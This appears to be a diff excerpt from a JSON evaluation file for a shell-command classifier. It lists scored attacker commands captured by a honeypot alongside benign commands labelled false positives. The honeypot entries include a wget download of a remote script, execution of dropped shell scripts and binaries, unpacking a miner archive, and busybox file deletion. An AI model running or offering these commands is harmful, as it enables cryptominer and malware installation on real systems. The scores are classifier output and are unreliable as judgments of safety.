+        "score": 0.02729203185057171,
+        "source": "honeypot"
+      },
+      {
+        "command": "chmod 777 3Update.sh",
+        "score": 0.11310814825141909,
+        "source": "honeypot"
+      },
+      {
+        "command": "tar xvf miner.tar",
+        "score": 0.07875657699707872,
+        "source": "honeypot"
+      },
+      {
+        "command": "sh 18064.sh",
+        "score": 0.318144099442072,
+        "source": "honeypot"
+      },
+      {
+        "command": "distance",
+        "score": 0.014829017728404332,
+        "source": "honeypot"
+      },
+      {
+        "command": "./C4uaUKSn",
+        "score": 0.017324742320615913,
+        "source": "honeypot"
+      },
+      {
+        "command": "chmod +x sshdsservers",
+        "score": 0.0867321326470565,
+        "source": "honeypot"
+      },
+      {
+        "command": "darkness",
+        "score": 0.014829017728404332,
+        "source": "honeypot"
+      },
+      {
+        "command": "/bin/busybox rm /proc/kcore/.none",
+        "score": 0.2510179347479569,
+        "source": "honeypot"
+      },
+      {
+        "command": "head -v -n 8 /proc/meminfo",
+        "score": 0.057439503915825425,
+        "source": "honeypot"
+      },
+      {
+        "command": "wget http://h1812cd2f.example.net/Pemex.sh",
+        "score": 0.2385859989880716,
+        "source": "honeypot"
+      },
+      {
+        "command": "sh bin2.sh",
+        "score": 0.2637482483022342,
+        "source": "honeypot"
+      },
+      {
+        "command": "chmod u+x syn2023",
+        "score": 0.12757821550308193,
+        "source": "honeypot"
+      }
+    ],
+    "false_positives": [
+      {
+        "command": "rm -rf /tmp/playlist.tmp && find ~/mp3 -name *.mp3 > /tmp/playlist.tmp && mplayer -playlist /tmp/playlist.tmp -shuffle -loop 0 | grep Playing",
+        "score": 0.7212066841346445,
+        "source": "commandlinefu"
+      },
+      {
+        "command": "perl -Mojo -E 'say g(\"http://ha20fa670.example.net/popclock/data/population/world\")->json->{'world'}{'population'};'",
+        "score": 0.8790440103285106,
+        "source": "commandlinefu"
+      },
+      {
+        "command": "markdown doc.md >/tmp/md.$$.html && firefox -new-tab /tmp/md.$$.html >/dev/null 2>&1 && rm -f /tmp/md.$$.html",
+        "score": 0.6392821800002588,
+        "source": "commandlinefu"
+      },
+      {
+        "command": "find ~/bin/ -name \"*sh\" -print0 | xargs -0t tar -zcvf foofile.tar.gz",
+        "score": 0.5604402097004278,
+        "source": "commandlinefu"
+      },
+      {
+        "command": "open R,\"curl -s http://h1025fe5c.example.net/Command-line-fu|xml2|\"; while(<R>){ chomp; m(^/rss/channel/item/title=) and do{ s/^.*?=//; ($t,$d,$l)=($_,undef,undef) }; m(^/rss/channel/item/description=) and do{ s/^.*?=//; push @d,$_ }; m(^/rss/channel/item",
+        "score": 0.5511759102113715,
+        "source": "commandlinefu"
+      },
+      {
+        "command": "urxvt --help 2>&1| sed -n '/: /s/^ */! URxvt*/gp' >> ~/.Xresources",
+        "score": 0.5843478279702545,
+        "source": "bash_history"
+      },
+      {
+        "command": "echo -n \"IP Address or Machine Name: \"; read IP; ping -c 1 -q $IP >/dev/null 2>&1 && echo -e \"\\e[00;32mOnline\\e[00m\" || echo -e \"\\e[00;31mOffline\\e[00m\"",
+        "score": 0.6011250910682921,
+        "source": "commandlinefu"
+      },
+      {
+        "command": "git branch -r | awk -F'/' '{print \"git fetch \"$1,$2}' | xargs -I {} sh -c {}",
+        "score": 0.6202713902573934,
+        "source": "commandlinefu"
+      },
+      {
+        "command": "scp -C 56.181.59.25:/tmp/backup.sql /path/to/backup.sql",
+        "score": 0.502957694706496,
+        "source": "commandlinefu"
+      },
+      {
+        "command": "for w in [WORT1] [WORTn]; do wget -O $w.mp3 $(wget -O - \"http://hd2cc5893.example.net/rechtschreibung/$w\" | grep -o \"http://hd2cc5893.example.net/_media_/audio/[^\\.]*\\.mp3\"); done",
+        "score": 0.5591610140151285,
+        "source": "commandlinefu"
+      },
+      {
+        "command": "curl -s http://h8e465e73.example.net/commands/by/$1/xml | awk -F'</?div[^>]*>' '/class=\\\"command\\\"/{gsub(/\"/,\"\\\"\",$2); gsub(/</,\"<\",$2); gsub(/>/,\">\",$2); gsub(/&/,\"\\\\&\",$2); cmd=$2} /class=\\\"num-votes\\\"/{printf(\"%3i %s\\n\", $2, cmd)}'",
+        "score": 0.6338927355840727,
+        "source": "commandlinefu"
+      },
+      {
+        "command": "sudo apt-get update 2> /tmp/keymissing; for key in $(grep \"NO_PUBKEY\" /tmp/keymissing |sed \"s/.*NO_PUBKEY //\"); do echo -e \"\\nProcessing key: $key\"; gpg --keyserver pool.sks-keyservers.net --recv $key && gpg --export --armor $key |sudo apt-key add -; done",
+        "score": 0.622543317861109,
+        "source": "commandlinefu"
+      },
+      {
+        "command": "a=$(b=$(($LINES/2));f() { for c in $(seq $b); do for i in $(seq $c);do echo x;done|xargs echo;done };paste <(f) <(f|tac|tr 'x' '-') <(f|tac|tr 'x' '-') <(f)|tr '\\t' ' ');(cat <<<\"$a\"|tac;cat <<<\"$a\")|tr '-' ' '",
+        "score": 0.5366625382095624,
+        "source": "commandlinefu"
+      },
+      {
+        "command": "perl -pe 's|@|>|;s|.*||s if $.%4==3 || $.%4==0;close $ARGV if eof' axo_right.fq > axo_right.fa &",
+        "score": 0.526566975832039,
         "source": "bash_history"
       }
     ]
